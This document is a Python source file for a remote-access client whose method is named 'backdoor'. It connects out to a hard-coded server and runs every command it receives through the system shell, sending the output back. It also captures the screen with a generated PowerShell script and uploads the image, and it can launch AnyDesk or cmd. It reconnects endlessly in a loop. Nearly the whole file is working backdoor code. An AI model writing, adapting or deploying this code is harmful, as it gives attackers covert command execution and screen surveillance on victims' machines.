import socket
import colorama
from termcolor import colored
import subprocess
import threading
from datetime import datetime
import random
import socket
import time
import tqdm
import os
import sys
from PIL import ImageGrab, Image


class Client:
    def __init__(self, server):
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 16184
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I-%M-%S"))
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname)).replace('.', '-')
        self.filename = \
            rf"c:\Users\{os.getlogin()}\Desktop\{self.hostname} {str(self.localIP).replace('.', '-')} {self.dt}.jpg"

    def connection(self):
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while True:
            time.sleep(2)
            print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
            try:
                soc.connect((self.server_host, self.server_port))
                self.backdoor(soc)

            except (TimeoutError, WindowsError, ConnectionAbortedError) as e:
                print(colored(e, 'red'))
                break
                # self.connection()

    def backdoor(self, soc):
        message = soc.recv(self.buffer_size).decode()
        print(f"{colored(message, 'green')}")

        while True:
            command = soc.recv(self.buffer_size).decode()
            try:
                if len(str(command)) == 0:
                    print(colored("[!]Disconnected!", 'red'))
                    soc.shutdown(0)
                    soc.close()
                    break

                if str(command.lower()) == "exit":
                    print(colored('[!]Connection closed by server.', 'yellow'))
                    break

                if str(command.lower()[:7]) == "anydesk":
                    # Start Anydesk
                    subprocess.call(r"C:\Program Files (x86)\AnyDesk\anydesk.exe")
                    soc.send(f"(@{self.hostname} | {self.localIP}: Anydesk Started\n".encode())

                if str(command.lower()) == "screen":
                    path = rf'c:\Users\{os.getlogin()}\Desktop'
                    name = 'sc.ps1'
                    with open(rf'{path}\{name}', 'w+') as file:
                        file.write("Add-Type -AssemblyName System.Windows.Forms\n")
                        file.write("Add-Type -AssemblyName System.Drawing\n\n")
                        file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
                        file.write("$Width  = $Screen.Width\n")
                        file.write("$Height = $Screen.Height\n")
                        file.write("$Left = $Screen.Left\n")
                        file.write("$Top = $Screen.Top\n\n")
                        file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
                        file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
                        file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
                        file.write(rf"$bitmap.Save('{self.filename}')")

                    time.sleep(0.2)
                    ps = subprocess.Popen(["powershell.exe", r"C:\Users\gilsh\Desktop\sc.ps1"], stdout=sys.stdout)
                    ps.communicate()
                    soc.send(f"{self.filename}".encode())
                    sendImg = open(self.filename, "rb")
                    while True:
                        data = sendImg.read()
                        soc.sendall(data)

                        if not data:
                            break

                    sendImg.close()
                    soc.close()

                if str(command.lower()) == "cmd":
                    subprocess.call([r'c:\Windows\System32\cmd.exe', '/k', r"c:\Users\gilsh\Desktop"])

            except Exception as err:
                print(colored(f"Error: {err} \n[!]Connection closed.", 'red'))
                break

            finally:
                output = subprocess.getoutput(command)
                soc.send(f"{output}\n".encode())

        soc.shutdown(socket.SHUT_RD)
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.close()
        self.connection()


if __name__ == "__main__":
    port = 55400
    servers = [('192.168.1.10', port)]
    while True:
        for server in servers:
            client = Client(server)
            client.connection()
